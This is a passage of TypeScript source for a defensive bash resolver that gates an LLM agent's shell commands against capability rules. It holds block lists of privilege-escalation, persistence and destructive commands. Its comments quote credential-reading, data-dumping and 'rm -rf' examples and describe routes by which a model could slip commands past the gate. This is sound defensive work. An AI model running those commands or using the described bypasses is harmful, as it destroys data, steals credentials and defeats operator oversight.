// bash resolver. Walks the tree-sitter-bash AST against a closed
// whitelist of node types per `TREE_SITTER_SHELL.md §9`. Anything
// inside the whitelist is decomposed into per-command capabilities;
// anything outside is `Refuse` with a specific reason. The whitelist
// IS the policy surface — adding a new shape means a PR against
// `TREE_SITTER_SHELL.md` plus conformance cases, not a silent code
// change.
//
// Design contracts:
//
//   1. Tree-sitter is the entry-point, not the authority. We trust
//      the AST shape for tokenization (quoting, line continuation,
//      heredoc bodies, $(...) detection) — but not for capability
//      resolution. Resolver maps `command_name` → COMMAND_TABLE;
//      unknown command names already trigger Refuse via the
//      `unknown_command` branch.
//
//   2. Reject early, reject loud. Every Refuse reason carries the
//      offending node type or command name so the operator + audit
//      forensics can pinpoint why a shape was rejected.
//
//   3. The whitelist is small. SIMPLE_COMMAND, SIMPLE_PIPELINE,
//      SIMPLE_SEQUENCE, plus literal redirects. Per `§9.1`.
//      Adversarial constructs (command_substitution, expansion,
//      function_definition, process_substitution, heredoc with
//      expansion in body, variable assignment prefix, ANSI-C
//      strings) are all Refuse — `§3.5` lists why each is red.
//
//   4. Protected paths from slice 1 close on the bash side.
//      classifyProtectedPath runs against every `word`-shaped arg
//      AND every file redirect target. Deny-tier → Refuse;
//      escalate-tier drops confidence to low so the engine forces
//      a confirm via slice-3 wiring.

import { basename, dirname, isAbsolute, join as joinPath, resolve as resolvePath } from 'node:path';
import type { Node } from 'web-tree-sitter';
import { parseBash } from '../bash-parser.ts';
import type { Capability } from '../capabilities.ts';
import {
  deleteFs,
  exec,
  gitWrite,
  netEgress,
  netIngress,
  readFs,
  writeFs,
} from '../capabilities.ts';
import {
  classifyProtectedPath,
  isGlobSafeRunCarveout,
  protectedTargets,
} from '../protected_paths.ts';
import {
  type Resolver,
  type ResolverContext,
  type ResolverResult,
  registerResolver,
} from './registry.ts';

const isNonEmptyString = (v: unknown): v is string => typeof v === 'string' && v.length > 0;

// Always lexically normalizes via `path.resolve(cwd, ...)` even when
// `path` is already absolute, so `..`/`./` components don't survive
// into the resulting capability scope. See slice 29 / fs.ts:resolveAbs
// for the security rationale.
//
// Tilde expansion (slice 97, R2 P0 finding): bash command-args
// receive the same `~` → `home` mapping the fs resolver applies.
// Without it, `cat ~/.ssh/id_rsa` resolves to a literal `~/.ssh/`
// under cwd in the capability scope, but the SHELL then expands
// `~` to the real HOME on execution — the gap between resolver
// view and runtime view is a §11 bypass. Both shapes the shell
// honors are expanded here:
//   - bare `'~'` → `ctx.home`
//   - `'~/<rest>'` → `<ctx.home>/<rest>`
// `'~user/...'` (other-user expansion) stays literal — the engine
// can't safely resolve another user's home without an OS call,
// and an LLM emitting `~root/...` is far more often an attack
// than a legitimate operator-aliased reference.
const expandTilde = (path: string, home: string): string => {
  if (path === '~') return home;
  if (path.startsWith('~/')) return `${home}/${path.slice(2)}`;
  return path;
};

const resolveArg = (path: string, ctx: ResolverContext): string =>
  resolvePath(ctx.cwd, expandTilde(path, ctx.home));

const EMPTY_FLAG_SET: ReadonlySet<string> = new Set();

// POSIX-aware positional extraction: tokens before `--` get the
// classic "starts-with-`-` is a flag" treatment; `--` itself is
// consumed; everything after is positional regardless of leading
// dash (per POSIX utility convention, e.g. `rm -- -rf` deletes a
// file literally named `-rf`).
//
// `valueFlags` (optional) lists flags whose NEXT space-separated
// token is the flag's value rather than a path/positional. Each
// such next-token is consumed alongside the flag. Per-command
// resolvers pass their own set: `head -n 5 file` → with
// `valueFlags={'-n'}` the '5' is consumed and only 'file' survives
// as a positional. Without the set, '5' would land as a bogus
// path operand (numeric literals flow into `shape.args` as `number`
// nodes, then through stripFlags as regular positionals).
//
// Combined forms like `--lines=5` are already dropped — they start
// with `-` and never reach the positional list.
const stripFlags = (
  tokens: readonly string[],
  valueFlags: ReadonlySet<string> = EMPTY_FLAG_SET,
): string[] => {
  const positional: string[] = [];
  let afterSep = false;
  let skipNext = false;
  for (const t of tokens) {
    if (skipNext) {
      skipNext = false;
      continue;
    }
    if (afterSep) {
      positional.push(t);
      continue;
    }
    if (t === '--') {
      afterSep = true;
      continue;
    }
    if (valueFlags.has(t)) {
      skipNext = true;
      continue;
    }
    if (!t.startsWith('-')) positional.push(t);
  }
  return positional;
};

// Extract values for a "value-flag" — a flag whose operand follows
// the flag itself. Covers all four shapes POSIX getopt + GNU
// coreutils accept:
//
//   long combined:    --foo=VAL
//   long spaced:      --foo VAL
//   short spaced:     -f VAL
//   short attached:   -fVAL              (only single-letter short)
//
// Returns ALL values found across the token stream.
//
// `shortForm` must be a single-letter flag (length 2 including the
// leading dash) for the attached branch to fire. Multi-letter
// "short" options used by find (`-newer`, `-maxdepth`) don't use
// attached form in coreutils; pass them via `longForm` only.
//
// `optionalValue: true` models the GNU `--foo[=VAL]` shape — the
// value is consumable ONLY via `=` (combined long) or attached
// short (`-fVAL`). Spaced forms (`--foo VAL` / `-f VAL`) leave VAL
// as a positional, matching getopt's optional-argument semantics
// (e.g., `mktemp --tmpdir tmpXXX` — `tmpXXX` is the TEMPLATE, NOT
// the tmpdir). Required-argument flags (the default) accept all
// four shapes.
const extractValueFlag = (
  tokens: readonly string[],
  spec: {
    readonly longForm?: string;
    readonly shortForm?: string;
    readonly optionalValue?: boolean;
  },
): string[] => {
  const optional = spec.optionalValue === true;
  const out: string[] = [];
  for (let i = 0; i < tokens.length; i += 1) {
    const t = tokens[i] ?? '';
    if (spec.longForm !== undefined) {
      const combinedPrefix = `${spec.longForm}=`;
      if (t.startsWith(combinedPrefix)) {
        const v = t.slice(combinedPrefix.length);
        if (v.length > 0) out.push(v);
        continue;
      }
      if (t === spec.longForm) {
        if (optional) continue;
        const next = tokens[i + 1];
        if (next !== undefined && !next.startsWith('-')) out.push(next);
        continue;
      }
    }
    if (spec.shortForm !== undefined) {
      if (t === spec.shortForm) {
        if (optional) continue;
        const next = tokens[i + 1];
        if (next !== undefined && !next.startsWith('-')) out.push(next);
        continue;
      }
      // Attached form — only single-letter shorts. Always honored
      // even when optionalValue=true (attached IS how getopt
      // expresses optional values for short options).
      if (
        spec.shortForm.length === 2 &&
        t.startsWith(spec.shortForm) &&
        t.length > spec.shortForm.length
      ) {
        const rest = t.slice(spec.shortForm.length);
        // POSIX getopt doesn't recognize `=` after short form, but
        // some wrappers emit it; tolerate by stripping a leading `=`.
        out.push(rest.startsWith('=') ? rest.slice(1) : rest);
      }
    }
  }
  return out;
};

// ─── Whitelist + red-flag node types (§9.1, §3.5) ──────────

// Node types that the resolver knows how to walk. Anything outside
// this set hits the `unsupported_shape` Refuse path. The list is
// intentionally small; new types need PR + conformance case +
// `TREE_SITTER_SHELL.md` update.
const WHITELIST_NODE_TYPES: ReadonlySet<string> = new Set([
  'program',
  'list',
  'pipeline',
  'command',
  'command_name',
  'word',
  'string',
  'string_content',
  'raw_string',
  'concatenation',
  'file_redirect',
  'redirected_statement',
  // File descriptor prefixes / dup targets in redirects.
  // `2>&1`, `cmd >&-`, `1>&2` — file_descriptor + the `>&`/`<&`
  // operator with a numeric target are pure fd manipulation; no
  // filesystem side effect.
  'file_descriptor',
  'number',
  // Operator / punctuation tokens. Tree-sitter exposes these as
  // anonymous nodes named after the literal text.
  '|',
  '||',
  '&&',
  ';',
  '&',
  '>',
  '>>',
  '<',
  '>|',
  '&>',
  '&>>',
  '>&',
  '<&',
  '"',
  "'",
]);

// Node types that, when present, indicate adversarial or dynamic
// shapes the resolver can't safely model. Each maps to a stable
// Refuse reason for the audit log + modal preview.
const RED_FLAG_NODES: ReadonlyMap<string, string> = new Map([
  [
    'command_substitution',
    'command_substitution ($(...) / backtick): inner script runs in subshell context',
  ],
  [
    'process_substitution',
    'process_substitution (<(...) / >(...)): side-effect process outside AST',
  ],
  ['expansion', 'parameter_expansion (${var/...}, ${var:-...}): runtime substitution'],
  ['simple_expansion', 'variable_expansion ($var): value not resolvable statically'],
  ['arithmetic_expansion', 'arithmetic_expansion ($((..))): can read/assign variables'],
  ['function_definition', 'function_definition: scope-dynamic; can shadow built-ins'],
  [
    'variable_assignment',
    'variable_assignment prefix (PATH=/tmp cmd): can override binary resolution',
  ],
  ['subscript', 'array_subscript: indexed/associative array access'],
  ['ansi_c_string', "ansi_c_string ($'...'): escape semantics not modeled"],
  ['heredoc_redirect', 'heredoc_redirect (<<DELIM): body interpretation not modeled'],
  ['herestring_redirect', 'herestring_redirect (<<<): body interpretation not modeled'],
  ['if_statement', 'if_statement: control flow not modeled'],
  ['while_statement', 'while_statement: control flow not modeled'],
  ['for_statement', 'for_statement: control flow not modeled'],
  ['case_statement', 'case_statement: control flow not modeled'],
  ['subshell', 'subshell ((cmd)): nested execution context'],
  ['compound_statement', 'compound_statement ({cmd;}): block context'],
  ['negated_command', 'negated_command (!cmd): control flow not modeled'],
  ['test_command', 'test_command ([[ ]]): conditional context'],
  ['test_operator', 'test_operator: conditional context'],
  // Note: tree-sitter-bash@0.25.1 does NOT emit distinct node-kinds
  // for several shapes that look like they'd warrant their own
  // entry — defenses for those route through alternate paths:
  //   - `=~` regex match → `binary_expression` inside `test_command`
  //   - `$"..."` translated string → regular `string` walker
  //   - `arr=(a b c)` → `variable_assignment` + `array` child
  //   - `coproc cmd` → regular `command` with `coproc` as name
  //     (falls through to `unknown_command` refuse)
  //   - `|&` last-pipe → anonymous operator token inside `pipeline`
  //     (caught by `detectPipeToShell` when the threat shape applies)
  // The grammar-drift snapshot suite surfaces any future kind a
  // version bump introduces.
]);

// Soft-unmodeled subset of RED_FLAG_NODES (PERMISSION_ENGINE.md §5.2,
// "Soft-unmodeled → Conservative"). These kinds aren't statically
// resolvable but don't, by themselves, enable arbitrary exec/injection:
// control flow, grouping, negation, conditionals, value expansion.
// walkAst RECURSES through these (instead of short-circuiting), marks the
// result `soft`, and collects the inner commands; the resolver then runs
// analyzeCommand on EVERY collected command and returns Conservative
// (→ confirm) only when `soft` is set and nothing hard-refused. So the
// model can run `for f in *.ts; do cat "$f"; done` (operator approves)
// while `for x in *; do eval "$x"; done` still hard-refuses (the inner
// `eval` is a HARD_REFUSE command caught by analyzeCommand). Everything
// in RED_FLAG_NODES NOT listed
// here (command/process substitution, function defs, `VAR=val cmd`
// prefix, arithmetic, heredoc/herestring, ansi-c, subscript) stays HARD:
// it enables exec/injection the resolver can't bound, so it remains a
// pre-policy Refuse that operator policy can't unlock.
const SOFT_UNMODELED_NODES: ReadonlySet<string> = new Set([
  'expansion', // ${var:-x} — value substitution
  'simple_expansion', // $var — value not resolvable statically
  'if_statement',
  'while_statement',
  'for_statement',
  'case_statement',
  'subshell', // ( cmd ) — inner commands still scanned for hard shapes
  'compound_statement', // { cmd; }
  'negated_command', // ! cmd
  'test_command', // [[ ]] / [ ]
  'test_operator',
]);

// Hard refuses by command name. §13 reject list from
// TREE_SITTER_SHELL.md §7 + §13. mkfs.* matches every filesystem
// variant via prefix.
const HARD_REFUSE_COMMANDS: ReadonlySet<string> = new Set([
  'eval',
  'exec',
  'source',
  '.',
  'trap',
  'alias',
  'shopt',
  'set',
  'unset',
  'declare',
  'export',
  'typeset',
  'readonly',
  'local',
  'dd',
  'fdisk',
  'parted',
  'mkswap',
  'shred',
  // Slice 128 (R4 P0-Launder-1): `command` and `builtin` are bash
  // builtins designed SPECIFICALLY to bypass alias/function lookup
  // and run a command directly. Same threat shape as `eval`: an
  // LLM typing `command rm -rf /home` routes through `cmdSysInfo`
  // (which emits read-fs:/etc only), bypassing cmdRm's delete-fs
  // attribution entirely. A narrow allow rule on read-fs:/etc then
  // admits arbitrary commands. Pre-slice `command` was registered
  // in COMMAND_TABLE as cmdSysInfo (silently treating it as a noop
  // info command) — now it's hard-refused before reaching the
  // table.
  'command',
  'builtin',
  // Shell-as-command (e.g., `bash script.sh`, `sh -c ...`). Same
  // threat shape as `eval`: inner shell runs anything, static
  // capability resolution impossible. SHELL_INTERPRETERS already
  // catches `... | sh` (pipe-to-shell); this catches the direct-
  // spawn shape with a stable refusal reason aligned with
  // `eval`/`source`/`command`/`builtin`.
  'bash',
  'sh',
  'zsh',
  'dash',
  'ksh',
  'fish',
  // Slice 180 (review — HARD_REFUSE gap). Six families added; each
  // shares the rationale of `eval` / `dd` / `mkfs.*`: there's no
  // safe way the static resolver can shape these into a typed
  // capability the engine can gate. Policy-via-allow is the wrong
  // surface — operator who wants `sudo apt update` once should use
  // `--sandbox-host` + an explicit policy rule, not a bash allow
  // pattern that compounds with other model output.
  //
  // Privilege escalation: any of these grants the LLM the host
  // user's full authority. CI runners with `NOPASSWD` configured
  // turn `sudo rm -rf /var` into a one-prompt RCE.
  'sudo',
  'doas',
  'pkexec',
  'su',
  // Namespace + privilege manipulation: `chroot` / `unshare` /
  // `nsenter` change the wrapped process's context out from under
  // the sandbox; `setpriv` flips capabilities directly.
  'chroot',
  'unshare',
  'nsenter',
  'setpriv',
  // User database mutation: adds attacker-controlled accounts +
  // groups. `visudo` rewrites the sudoers file.
  'useradd',
  'userdel',
  'usermod',
  'groupadd',
  'groupdel',
  'groupmod',
  'passwd',
  'chpasswd',
  'visudo',
  // System halt + boot transition: every one can terminate the
  // host or load a new kernel image.
  'reboot',
  'shutdown',
  'halt',
  'poweroff',
  'kexec',
  // Init / runlevel — same threat shape.
  'init',
  'telinit',
  // Scheduled persistence: `crontab` / `at` / `batch` plant
  // commands that fire later, outside the current audit chain.
  // `systemd-run` is the systemd equivalent.
  'crontab',
  'at',
  'batch',
  'systemd-run',
  // Kernel module load/unload: `insmod` / `rmmod` / `modprobe` are
  // direct kernel-code injection vectors. `depmod` rebuilds the
  // module dependency map (less direct but enables module load).
  'insmod',
  'rmmod',
  'modprobe',
  'depmod',
  // Destructive filesystem ops not covered by `dd` / `mkfs.*`:
  //   `wipefs` strips filesystem signatures (negative of mkfs).
  //   `debugfs` is direct ext2/3/4 manipulation.
  //   `tune2fs` / `xfs_admin` mutate fs metadata (label, UUID, etc).
  //   `hdparm -w` is destructive disk reformat.
  //   `badblocks -w` does destructive write tests.
  'wipefs',
  'debugfs',
  'tune2fs',
  'xfs_admin',
  'hdparm',
  'badblocks',
]);

const isHardRefuseCommand = (name: string): boolean => {
  if (HARD_REFUSE_COMMANDS.has(name)) return true;
  if (name.startsWith('mkfs.')) return true;
  return false;
};

// Pipe-to-shell pattern detection. A pipeline whose final stage is a
// shell interpreter (`sh`, `bash`, `zsh`, etc.) reads its stdin as a
// script — fully arbitrary. Refuse.
//
// Slice 147 (review R1): expanded beyond shells. Spec §5.2's
// "pipe-to-X" pattern is canonical for `... | sh`, but the same
// vector applies to ANY interpreter that reads stdin as code when
// invoked without an explicit script argument:
//
//   python / python3   — `python` no-arg reads stdin as Python script
//   node / nodejs      — `node` no-arg drops to REPL but `node -` reads
//                        stdin as JS; pipe-to-node is the same threat
//   ruby               — `ruby` no-arg reads stdin as Ruby script
//   perl               — `perl` no-arg reads stdin as Perl script
//   php                — `php --` reads stdin as PHP script
//   lua / luajit       — `lua` no-arg reads stdin
//
// `tee` / `xargs` / `awk` / `sed` are NOT in the list — they take
// their script from arguments, not from stdin. `xargs sh -c` is a
// separate shape: the last-pipe-stage's command_name is `xargs`,
// not the inner interpreter. Caught below via `detectXargsToShell`.
const SHELL_INTERPRETERS: ReadonlySet<string> = new Set([
  'sh',
  'bash',
  'zsh',
  'dash',
  'ksh',
  'fish',
  'python',
  'python3',
  'node',
  'nodejs',
  'ruby',
  'perl',
  'php',
  'lua',
  'luajit',
]);

// ─── COMMAND_TABLE ─────────────────────────────────────────────

// Per-command resolver. Same shape as slice 3 — takes positional
// args + flags + ctx, returns capabilities + confidence OR refuse
// reason. The whitelist walk decomposes the AST into these inputs
// per `command` node.
// Slice 152 (review calibration): expanded the confidence union to
// include 'low'. Pre-slice every CommandResolver returned 'high'
// or 'medium' — there was no expressible "I'm guessing, force the
// confirm gate" path. cmdGit unknown subcommand needed it; the
// risk-score system already had `confidence_low: 0.3` waiting for
// a resolver-side emitter.
type CommandResolverResult =
  | { capabilities: Capability[]; confidence: 'high' | 'medium' | 'low' }
  | { refuse: string };

type CommandResolver = (
  positional: string[],
  allTokens: readonly string[],
  ctx: ResolverContext,
) => CommandResolverResult;

const cmdRead: CommandResolver = (positional, _tokens, ctx) => {
  if (positional.length === 0) {
    return { capabilities: [readFs(ctx.cwd)], confidence: 'high' };
  }
  return {
    capabilities: positional.map((p) => readFs(resolveArg(p, ctx))),
    confidence: 'high',
  };
};

// Variant of cmdRead for utilities that take a numeric value flag
// (`head -n 5 file`, `tail -c 100 file`). The value would
// otherwise land in `positional` as a bogus path operand
// (`read-fs:<cwd>/5`) and trip narrow envelopes or strict policies.
// Re-strips `tokens` with the flag-value set so we ignore the
// generic `positional` parameter.
const READ_WITH_SIZE_VALUE_FLAGS: ReadonlySet<string> = new Set(['-n', '-c', '--lines', '--bytes']);

const cmdReadWithSize: CommandResolver = (_positional, tokens, ctx) => {
  const positional = stripFlags(tokens, READ_WITH_SIZE_VALUE_FLAGS);
  if (positional.length === 0) {
    return { capabilities: [readFs(ctx.cwd)], confidence: 'high' };
  }
  return {
    capabilities: positional.map((p) => readFs(resolveArg(p, ctx))),
    confidence: 'high',
  };
};

// Pure-output writers (echo / printf). They emit their arguments
// verbatim to stdout — a string like "/etc/passwd" passed to echo
// is NOT a filesystem read, it's text. No read-fs capability is
// attributed. Redirects (`echo hi > /etc/foo`) are still inspected
// separately in `analyzeCommand` and trigger the protected-path
// check on the redirect target regardless of source command.
const cmdEcho: CommandResolver = () => ({ capabilities: [], confidence: 'high' });

// grep / rg: first positional is the regex pattern, NOT a path.
// Skip it. Remaining positionals (if any) are file paths the
// command reads from. With no file positionals the command reads
// from stdin — attribute read-fs of cwd as a conservative floor
// for pipeline composition. The `-exec` escape hatch maps to
// arbitrary exec like find's.
// Slice 128 (R4 P0-Launder-4): grep / find exec-shaped flags.
// All four GNU `find` variants run an arbitrary command; pre-slice
// only `-exec`/`--exec` were detected. `-execdir` is the same
// threat shape with a different cwd at exec time; `-ok` / `-okdir`
// prompt the user but the prompt happens AFTER the binary is
// already invoked (the prompt is a no-op if non-interactive).
const FIND_EXEC_FLAGS: ReadonlySet<string> = new Set([
  '-exec',
  '--exec',
  '-execdir',
  '--execdir',
  '-ok',
  '-okdir',
]);

// grep flags whose next space-separated token is a numeric value
// (context window size, max-count, etc.). Without consuming them
// in stripFlags, `grep -A 5 pattern file` would leave '5' in the
// positional list and cmdGrep would emit a bogus `read-fs:<cwd>/5`.
// `-f` / `--file` / `--include-from` / `--exclude-from` /
// `--exclude-dir-from` are NOT here — their explicit decode below
// already records the file read AND the positional[0]=pattern
// convention still applies after the leading flag is dropped.
const GREP_VALUE_FLAGS: ReadonlySet<string> = new Set([
  '-A',
  '-B',
  '-C',
  '-m',
  '--after-context',
  '--before-context',
  '--context',
  '--max-count',
]);

const cmdGrep: CommandResolver = (_positional, tokens, ctx) => {
  const positional = stripFlags(tokens, GREP_VALUE_FLAGS);
  if (tokens.some((t) => FIND_EXEC_FLAGS.has(t))) {
    return {
      capabilities: [exec('arbitrary'), readFs(ctx.cwd)],
      confidence: 'medium',
    };
  }

  // Slice 174 (review — info-leak P1). grep's `-f <file>` /
  // `--file=<file>` flag reads the pattern list from a file. ripgrep
  // mirrors the same `-f`/`--file=` shape. Pre-slice the resolver
  // only read positional[1..] as the input files; `-f
  // /home/user/.aws/credentials` was completely invisible to the
  // capability audit. An adversarial `grep -f /etc/shadow -r ./src`
  // would walk past a `deny: read-fs:/etc/**` rule because the
  // resolver never emitted `readFs(/etc/shadow)` — only
  // `readFs(./src)`. We decode the file operand of `-f` and
  // emit a read capability so the engine sees both reads.
  //
  // The pattern path can appear as:
  //   -f <file>          (space-separated)
  //   -f<file>           (short combined; no equals)
  //   --file=<file>      (long with equals)
  //   --file <file>      (long with space — not standard POSIX but
  //                       GNU grep accepts it)
  // `-f -` reads patterns from stdin (not a file read); filtered
  // below. Slice 179 added --include-from / --exclude-from /
  // --exclude-dir-from to the same defense.
  const GREP_FILE_PATH_SPECS: readonly { longForm: string; shortForm?: string }[] = [
    { longForm: '--file', shortForm: '-f' },
    { longForm: '--include-from' },
    { longForm: '--exclude-from' },
    { longForm: '--exclude-dir-from' },
  ];
  const patternFileReads: string[] = [];
  for (const spec of GREP_FILE_PATH_SPECS) {
    for (const v of extractValueFlag(tokens, spec)) {
      if (v !== '-') patternFileReads.push(resolveArg(v, ctx));
    }
  }

  const pathArgs = positional.slice(1);
  if (pathArgs.length === 0) {
    return {
      capabilities: [readFs(ctx.cwd), ...patternFileReads.map((p) => readFs(p))],
      confidence: 'high',
    };
  }
  return {
    capabilities: [
      ...pathArgs.map((p) => readFs(resolveArg(p, ctx))),
      ...patternFileReads.map((p) => readFs(p)),
    ],
    confidence: 'high',
  };
};

// find: all positionals are filesystem paths (find DIR1 DIR2 -name ...).
// Pattern-style filters arrive as flags and are excluded by stripFlags.
//
// Slice 167 (review — Batch E threat surface). The `-delete` flag is
// find's built-in deletion primitive — it removes every match without
// invoking an external binary, so the existing FIND_EXEC_FLAGS check
// (which routes through exec:arbitrary) misses it entirely. Pre-slice
// `find / -name '*.config' -delete` resolved to `[readFs(/)]` with
// `confidence: 'high'` — no delete-fs attribution, no RM_REFUSE_ROOTS
// gate. A `deny: read-fs:**` operator policy didn't fire because the
// resolver didn't emit a delete capability. Now `-delete` emits
// `delete-fs:<path>` for each positional + reuses RM_REFUSE_ROOTS as
// a hardcoded refuse for catastrophic targets (`find / -delete`,
// `find /etc -delete`, etc.) — same posture as `cmdRm`.
//
// `-delete` is a positional-style filter from find's grammar (not a
// flag with a value); stripFlags leaves it in the `tokens` array. We
// scan tokens to detect it.
// find flags whose next space-separated token is a value (depth
// limit, time predicate, size, name pattern, type filter, etc.) —
// NOT a search-root path. Without consuming them in stripFlags,
// `find . -maxdepth 2 -type f -name foo src` would land `2`, `f`,
// `foo` as bogus readFs targets alongside the real roots `.` and
// `src`.
const FIND_VALUE_FLAGS: ReadonlySet<string> = new Set([
  // Depth / time / size / numeric predicates
  '-maxdepth',
  '-mindepth',
  '-amin',
  '-atime',
  '-cmin',
  '-ctime',
  '-mmin',
  '-mtime',
  '-size',
  '-uid',
  '-gid',
  '-inum',
  '-links',
  // Pattern / type / mode predicates (string values)
  '-name',
  '-iname',
  '-path',
  '-ipath',
  '-regex',
  '-iregex',
  '-user',
  '-group',
  '-perm',
  '-type',
  // File-comparison predicates — FILE operand isn't a search path.
  '-newer',
  '-anewer',
  '-cnewer',
  // -fprint / -fprintf / -fls take a FILE operand. The explicit
  // decode below also consumes it and emits write-fs; listing here
  // drops the FILE from the path-positional list.
  '-fprint',
  '-fprintf',
  '-fls',
  '-printf',
]);

const cmdFind: CommandResolver = (_positional, tokens, ctx) => {
  if (tokens.some((t) => FIND_EXEC_FLAGS.has(t))) {
    return {
      capabilities: [exec('arbitrary'), readFs(ctx.cwd)],
      confidence: 'medium',
    };
  }
  const positional = stripFlags(tokens, FIND_VALUE_FLAGS);
  const paths = positional.length === 0 ? [ctx.cwd] : positional.map((p) => resolveArg(p, ctx));

  // Slice 174 (review — info-leak P1). find's `-fprint`,
  // `-fprintf`, and `-fls` flags write match output to a named
  // FILE without invoking an external binary. Pre-slice the
  // resolver emitted only read-fs for the search roots; the
  // WRITE side of `find / -name '*.env' -fprint /tmp/loot.txt`
  // was completely invisible. `deny: write-fs:/tmp/**` didn't
  // fire because write-fs was never emitted, and the operator's
  // modal saw only read intent. Now we decode the FILE operand
  // of each fprint-family flag into a write-fs capability.
  //
  // Flag shapes:
  //   -fprint   <file>            → write each match path to file
  //   -fprintf  <file> <format>   → formatted write
  //   -fls      <file>            → ls-style listing
  // Each takes the FILE as the immediately-following positional;
  // for -fprintf the second argument is a format string (not a
  // path) and is deliberately NOT classified as a read. find's
  // `-print` / `-printf` / `-ls` (no `f` prefix) write to stdout,
  // not a file — not decoded.
  // find's `-foo VALUE` predicates use a single-dash "long" form
  // with space-separated value; no attached / `=` shape is
  // accepted by GNU find. Pass via longForm only.
  const FIND_WRITE_PATH_FLAGS: readonly string[] = ['-fprint', '-fprintf', '-fls'];
  const FIND_READ_PATH_FLAGS: readonly string[] = ['-newer', '-anewer', '-cnewer'];
  const writeTargets: string[] = [];
  const comparisonReadTargets: string[] = [];
  for (const flag of FIND_WRITE_PATH_FLAGS) {
    for (const v of extractValueFlag(tokens, { longForm: flag })) {
      writeTargets.push(resolveArg(v, ctx));
    }
  }
  for (const flag of FIND_READ_PATH_FLAGS) {
    for (const v of extractValueFlag(tokens, { longForm: flag })) {
      comparisonReadTargets.push(resolveArg(v, ctx));
    }
  }

  // Slice 167: -delete attribution.
  if (tokens.some((t) => t === '-delete')) {
    // Hardcoded refuse for catastrophic targets (parity with cmdRm).
    for (const p of paths) {
      if (RM_REFUSE_ROOTS.has(p)) {
        return {
          refuse: `find -delete: refuse to delete under system root '${p}' (hardcoded blocklist; spec §5.2)`,
        };
      }
    }
    // Emit delete-fs for each positional (write-fs implied for
    // policy callers that only filter by kind prefix). Read-fs
    // also emitted because find still walks the tree before
    // deleting — operator policy on read can still gate the call.
    // Slice 174: fprint write targets stack on top of -delete
    // (a single find can both write a match list and delete).
    return {
      capabilities: [
        ...paths.map((p) => readFs(p)),
        ...paths.map((p) => deleteFs(p)),
        ...writeTargets.map((p) => writeFs(p)),
        ...comparisonReadTargets.map((p) => readFs(p)),
      ],
      confidence: 'high',
    };
  }
  return {
    capabilities: [
      ...paths.map((p) => readFs(p)),
      ...writeTargets.map((p) => writeFs(p)),
      ...comparisonReadTargets.map((p) => readFs(p)),
    ],
    confidence: 'high',
  };
};

// Slice 147 (review): hardcoded refuse list for `rm` arguments
// that point at system roots or the operator's home. Spec §5.2
// and the comment in `protected_paths.ts:30` BOTH claim a "bash
// deny list" catches `rm -rf /` — pre-slice that list didn't
// exist. Defense in depth: `classifyProtectedPath` covers
// individual sensitive subpaths (`/etc`, `~/.ssh`, etc.) as
// `escalate` (write upgrades to confirm), but `/` itself wasn't
// in any list. The score gate (capability_risk + workspace_escape
// + blocklist_command ≈ 0.85) DID push `rm -rf /` to confirm under
// default policy, and default-deny vetoed without an allow rule —
// but a permissive `allow delete-fs:/**` (which `parsePolicy`
// doesn't reject for glob shapes) would silently auto-allow.
// Hardcoded refuse is policy-independent.
//
// Entries are POSIX system root dirs whose deletion catastrophically
// breaks the host. The list intentionally OMITS `/tmp`, `/var/log`,
// `/var/tmp` — those are legitimately rm-able under workflows.
const RM_REFUSE_ROOTS: ReadonlySet<string> = new Set([
  // POSIX / Linux system roots
  '/',
  '/etc',
  '/usr',
  '/usr/local', // Homebrew + Linux site-installs root
  '/var',
  '/lib',
  '/lib64',
  '/bin',
  '/sbin',
  '/boot',
  '/root',
  '/opt',
  '/home',
  '/dev',
  '/proc',
  '/sys',
  // Slice 180: runtime + storage roots paralelos aos system dirs.
  //   `/run` + `/var/run` — runtime sockets (docker.sock, etc).
  //   `/srv` — server data root on systemd hosts.
  //   `/mnt` + `/media` — mount points; rm here may unmount + erase
  //     external storage (rare but catastrophic when it happens).
  '/run',
  '/var/run',
  '/srv',
  '/mnt',
  '/media',
  // Slice 180: macOS system roots. Pre-slice the list was
  // Linux-only — `rm -rf /Users` on macOS (equivalent to `/home`)
  // walked past. Apple's hierarchy:
  //   `/Users` — equivalent to `/home`.
  //   `/Applications` — system + user app bundles.
  //   `/Library` — system libs + user prefs (mixed with `/Users/<u>/Library`).
  //   `/System` — Apple-owned; modifications break the OS.
  //   `/private` — real path of many system dirs (`/etc` → `/private/etc`,
  //                `/tmp` → `/private/tmp`, `/var` → `/private/var`).
  //                Listing `/private` ROOT — not specific subpaths — because
  //                rm-rf at any prefix is the catastrophic shape; deeper
  //                paths route through the regular escalate tier.
  '/Users',
  '/Applications',
  '/Library',
  '/System',
  '/private',
]);

// Home-relative roots whose ENTIRE-DIRECTORY deletion is
// catastrophic — credential / config trees that mirror the
// posture of RM_REFUSE_ROOTS on the system side. `rm -rf /etc` and
// `rm -rf ~/.ssh` have the same blast radius (operator
// credentials destroyed); both must refuse at the resolver.
// Subpaths (`~/.ssh/old_id_rsa`) still route through the regular
// escalate tier in `classifyProtectedPath`; only `rm` against the
// ROOT itself hits this list. Resolved against `ctx.home` at
// check time so per-user paths (`/home/alice/.ssh`,
// `/Users/bob/.ssh`) all hit the same rule.
//
// Known gap: the resolved set is anchored on `ctx.home`, so
// `rm -rf /home/OTHER_USER/.ssh` does NOT match this rule.
// `/home/OTHER_USER` is also not in RM_REFUSE_ROOTS (only `/home`
// root is), and `classifyProtectedPath` resolves tildeEscalateDirs
// against `ctx.home` too. Net: the call resolves to a normal
// `delete-fs` capability and falls to operator policy.
// Hard-refusing every absolute path under `/home/*` would break
// legitimate sysadmin cleanup workflows.
//
// Coverage:
//   .ssh           — SSH private keys + authorized_keys
//   .gnupg         — GPG private keys + keyrings
//   .aws           — AWS credentials + config (long-lived API keys)
//   .kube          — Kubernetes cluster configs + tokens
//   .config        — Operator's app config root (XDG_CONFIG_HOME default)
//   .local         — XDG_DATA_HOME default; agent data, shell history
//   .docker        — Docker config + credsStore registry auth
//
// Out of scope: `~/Documents`, `~/Desktop`, etc. — user data dirs
// whose deletion is destructive but operator-recoverable. Operator
// who wants `rm ~/Documents` can confirm via the modal.
const RM_REFUSE_HOME_DIRS: readonly string[] = [
  '.ssh',
  '.gnupg',
  '.aws',
  '.kube',
  '.config',
  '.local',
  '.docker',
];

const cmdRm: CommandResolver = (positional, _tokens, ctx) => {
  if (positional.length === 0) {
    return { refuse: 'rm: missing target' };
  }
  // Slice 147 (review): hardcoded refuse for catastrophic targets.
  // Runs BEFORE delete-fs capability emission so the refusal is
  // attributed to the resolver (forensically traceable to a
  // specific spec line) rather than to a downstream policy check
  // that could be misconfigured away.
